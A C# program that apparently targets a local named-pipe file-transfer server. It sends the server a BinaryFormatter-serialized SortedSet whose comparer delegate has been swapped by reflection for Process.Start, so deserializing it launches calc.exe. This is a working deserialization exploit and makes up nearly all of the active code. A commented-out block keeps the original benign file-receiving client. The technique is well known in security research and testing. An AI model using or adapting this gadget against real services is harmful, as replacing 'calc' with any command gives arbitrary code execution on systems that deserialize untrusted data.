using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Reflection;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;

namespace ClientPipe
{
    class Program
    {
        static void TypeConfuseDelegate(Comparison<string> comp)
        {
            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = comp.GetInvocationList();
            // Modify the invocation list to add Process::Start(string, string)
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(comp, invoke_list);
        }

        static void Main(string[] args)
        {
            
            //connecting to the known pipe stream server which runs in localhost
            using (NamedPipeClientStream pipeClient =
                new NamedPipeClientStream(".", "File Transfer", PipeDirection.InOut))
            {
                // Connect to the pipe or wait until the pipe is available.
                Console.Write("Attempting to connect to File Transfer pipe...");

                pipeClient.Connect();

                Console.WriteLine("Connected to File Transfer pipe.");

                // Create a simple multicast delegate.
                Delegate da = new Comparison<string>(String.Compare);
                Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
                // Create set with original comparer.
                IComparer<string> comp = Comparer<string>.Create(d);
                SortedSet<string> set = new SortedSet<string>(comp);

                // Setup values to call calc.exe with a dummy argument.
                set.Add("calc");
                set.Add("adummy");

                TypeConfuseDelegate(d);

                new BinaryFormatter
                {
                    AssemblyFormat = FormatterAssemblyStyle.Simple
                }.Serialize(pipeClient, set);

            }
            Console.Write("Press Enter to continue...");
            Console.ReadLine();  

            #region workingPipeClient
            /*
            //connecting to the known pipe stream server which runs in localhost
            using (NamedPipeClientStream pipeClient =
                new NamedPipeClientStream(".", "File Transfer", PipeDirection.In))
            {
                // Connect to the pipe or wait until the pipe is available.
                Console.Write("Attempting to connect to File Transfer pipe...");
                //time out can also be specified
                pipeClient.Connect();

                Console.WriteLine("Connected to File Transfer pipe.");


                BinaryReader reader = new BinaryReader(pipeClient, Encoding.UTF8, true);
                string fileName = reader.ReadString();
                
                //creating the target file with name same as specified in source which comes using
                //file transfer object
                using (FileStream fs = new FileStream(@"c:\tools\NamedPipes\client\" + fileName, FileMode.Create, FileAccess.Write))
                {
                    pipeClient.CopyTo(fs);
                }
                Console.WriteLine("File, Received from server: {0}", fileName);

            }
            Console.Write("Press Enter to continue...");
            Console.ReadLine();
           */
            #endregion
        }
    }
}
